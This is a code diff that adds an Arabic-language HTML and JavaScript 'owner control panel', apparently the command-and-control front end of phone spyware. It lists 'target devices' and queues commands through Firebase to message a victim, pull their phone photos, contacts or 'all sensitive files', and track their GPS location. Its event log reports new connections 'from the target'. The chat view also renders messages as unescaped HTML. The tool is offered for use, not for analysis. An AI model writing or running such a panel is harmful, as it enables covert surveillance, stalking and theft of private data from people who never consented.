@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>[ W ] OWNER CONTROL PANEL</title>
+  <link rel="stylesheet" href="cyber-theme.css">
+</head>
+<body>
+  <canvas id="matrixCanvas" class="matrix-bg"></canvas>
+
+  <div class="cyber-container">
+    <!-- الرأس -->
+    <div class="cyber-box" style="display:flex;justify-content:space-between;align-items:center;">
+      <div>
+        <h3>[ W ] OWNER CONTROL PANEL</h3>
+        <p>مرحبًا بك في محرك الدمى</p>
+      </div>
+      <div>
+        <div id="serverStatus" class="status-badge status-online">ONLINE</div>
+        <button class="cyber-btn" style="padding:4px 8px;font-size:0.7rem;margin-top:5px;" onclick="refreshDevices()">تحديث</button>
+      </div>
+    </div>
+
+    <!-- لوحة الأهداف المتاحة -->
+    <div class="cyber-box">
+      <h3>[+] أجهزة الأهداف المرتبطة</h3>
+      <div id="devicesList">
+        <!-- يُعبأ ديناميكياً من قاعدة البيانات -->
+        <div class="cyber-box" style="margin-bottom:8px;padding:8px;">
+          <p><b>الجهاز:</b> TARGET_DEVICE_01</p>
+          <p><b>الحالة:</b> <span style="color:var(--neon-green);">متصل</span></p>
+          <button class="cyber-btn" onclick="selectDevice('TARGET_DEVICE_01')">لوحة التحكم والأوامر</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- لوحة الأوامر المتقدمة (تظهر عند اختيار الجهاز) -->
+    <div class="cyber-box" id="commandPanel" style="display:block;">
+      <h3>⚡ لوحة الأوامر [ TARGET_DEVICE_01 ]</h3>
+      
+      <div style="margin-bottom:10px;">
+        <label>أ. إرسال رسالة:</label>
+        <input type="text" id="cmdMsg" placeholder="نص الرسالة للهدف...">
+        <button class="cyber-btn" onclick="sendCommand('MSG')">تنفيذ الأمر: إرسال</button>
+      </div>
+
+      <div style="margin-bottom:10px;">
+        <label>ب. طلب مشاركة ملف:</label>
+        <select id="fileType">
+          <option value="images">صور الجوال</option>
+          <option value="contacts">جهات الاتصال</option>
+          <option value="all">كل الملفات الحساسة</option>
+        </select>
+        <button class="cyber-btn" onclick="sendCommand('FILE_REQ')">أمر: ابدأ سحب الملف</button>
+      </div>
+
+      <div style="margin-bottom:10px;">
+        <label>ج. طلب الموقع (wil):</label>
+        <button class="cyber-btn" onclick="sendCommand('LOC_REQ')">أمر wil :: تتبع الموقع</button>
+      </div>
+    </div>
+
+    <!-- سجل الأحداث الحقيقي (System Event Log) -->
+    <div class="cyber-box">
+      <h3>SYSTEM EVENT LOG</h3>
+      <div id="eventLog" style="height:120px;overflow-y:auto;font-size:0.75rem;border:1px solid var(--dark-green);padding:5px;">
+        <p>[18:20:01] النظام جاهز ومستقر.</p>
+        <p>[18:21:45] تم رصد اتصال جديد من الهدف.</p>
+      </div>
+    </div>
+
+    <!-- الشات العكسي للمالك -->
+    <div class="cyber-box">
+      <h3>◈ شات المالك المباشر</h3>
+      <div id="ownerChatMessages" style="height:120px;overflow-y:auto;border:1px solid var(--dark-green);padding:5px;margin-bottom:8px;font-size:0.8rem;"></div>
+      <input type="text" id="ownerChatInput" placeholder="اكتب ردك هنا...">
+      <button class="cyber-btn" onclick="sendOwnerMessage()">إرسال رد</button>
+    </div>
+  </div>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+    import { getFirestore, collection, addDoc, query, onSnapshot, orderBy, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "YOUR_API_KEY",
+      authDomain: "YOUR_AUTH_DOMAIN",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_STORAGE_BUCKET",
+      messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
+      appId: "YOUR_APP_ID"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    window.refreshDevices = function() {
+      alert("تم تحديث حالة الأجهزة المتصلة من الخادم.");
+    }
+
+    window.sendCommand = async function(type) {
+      let details = "";
+      if(type === 'MSG') details = document.getElementById('cmdMsg').value;
+      if(type === 'FILE_REQ') details = document.getElementById('fileType').value;
+      if(type === 'LOC_REQ') details = "GPS_TRACKING_WIL";
+
+      try {
+        await addDoc(collection(db, "commands"), {
+          type: type,
+          details: details,
+          status: "PENDING",
+          timestamp: serverTimestamp()
+        });
+        logEvent(`تم إرسال الأمر (${type}) بنجاح بحالة PENDING.`);
+        alert("تم إرسال الطلب إلى الخادم بنجاح.");
+      } catch(e) {
+        alert("فشل إرسال الأمر.");
+      }
+    }
+
+    function logEvent(text) {
+      const log = document.getElementById('eventLog');
+      const time = new Date().toLocaleTimeString();
+      log.innerHTML += `<p>[${time}] ${text}</p>`;
+      log.scrollTop = log.scrollHeight;
+    }
+
+    // تتبع شات المالك
+    const q = query(collection(db, "messages"), orderBy("timestamp", "asc"));
+    onSnapshot(q, (snapshot) => {
+      let html = "";
+      snapshot.forEach((doc) => {
+        const data = doc.data();
+        html += `<div style="margin-bottom:5px;"><b>${data.sender}:</b> ${data.text}</div>`;
+      });
+      document.getElementById('ownerChatMessages').innerHTML = html;
+      document.getElementById('ownerChatMessages').scrollTop = document.getElementById('ownerChatMessages').scrollHeight;
+    });
+
+    window.sendOwnerMessage = async function() {
+      const text = document.getElementById('ownerChatInput').value;
+      if(!text) return;
+      await addDoc(collection(db, "messages"), {
+        sender: "OWNER",
+        text: text,
+        timestamp: serverTimestamp()
+      });
+      document.getElementById('ownerChatInput').value = "";
+    }
+  </script>
+</body>
+  </html>
+  
